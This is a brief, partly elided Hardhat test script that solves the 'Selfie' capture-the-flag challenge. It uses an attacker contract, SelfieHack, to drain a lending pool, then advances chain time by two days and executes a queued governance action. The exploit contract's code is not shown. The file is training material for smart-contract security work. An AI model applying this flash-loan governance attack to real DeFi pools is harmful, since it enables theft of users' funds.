...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const Hack = await ethers.getContractFactory("SelfieHack", deployer);
    ...
    await hack.connect(attacker).hack(TOKENS_IN_POOL);
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await hack.connect(attacker).executeAction();
  });
